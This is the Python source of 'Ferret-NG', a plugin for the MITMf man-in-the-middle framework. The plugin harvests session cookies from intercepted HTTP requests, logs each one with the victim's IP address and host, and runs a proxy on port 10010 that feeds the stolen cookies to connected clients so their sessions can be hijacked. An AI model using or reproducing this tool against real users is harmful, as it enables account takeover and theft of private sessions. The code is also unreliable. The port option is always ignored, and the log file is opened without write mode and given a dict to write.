#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging

from datetime import datetime
from plugins.plugin import Plugin
from twisted.internet import reactor
from twisted.web import http
from twisted.internet import reactor
from core.ferretng.FerretProxy import FerretProxy
from core.ferretng.URLMonitor import URLMonitor

mitmf_logger = logging.getLogger("mitmf")

class FerretNG(Plugin):
	name        = "Ferret-NG"
	optname     = "ferretng"
	desc        = "Captures cookies and starts a proxy that will feed them to connected clients"
	version     = "0.1"
	has_opts    = True

	def initialize(self, options):
		'''Called if plugin is enabled, passed the options namespace'''
		self.options = options
		self.ferret_port = 10010 or options.ferret_port

		self.tree_info.append("Listening on port {}".format(self.ferret_port))

	def clientRequest(self, request):
		if 'cookie' in request.headers:
			host   = request.headers['host']
			cookie = request.headers['cookie']
			client = request.client.getClientIP()
			if host not in URLMonitor.getInstance().cookies:
				mitmf_logger.info("{} [Ferret-NG] Host: {} Captured cookie: {}".format(client, host, cookie))
			URLMonitor.getInstance().cookies[client] = {'host': host, 'cookie': cookie}

	def pluginReactor(self, StrippingProxy):
		FerretFactory = http.HTTPFactory(timeout=10)
		FerretFactory.protocol = FerretProxy
		reactor.listenTCP(self.ferret_port, FerretFactory)

	def pluginOptions(self, options):
		options.add_argument('--port', dest='ferret_port', metavar='PORT', type=int, default=None, help='Port to start Ferret-NG proxy on (default 10010)')
		options.add_argument('--load-cookies', dest='cookie_file', metavar='FILE', type=str, default=None, help='Load cookies from log file')

	def finish(self):
		mitmf_logger.info("[Ferret-NG] Writing cookies to log file")
		with open('./logs/ferret-ng/cookies-{}.log'.format(datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))) as cookie_file:
			cookie_file.write(URLMonitor.getInstance().cookies)
			cookie_file.close()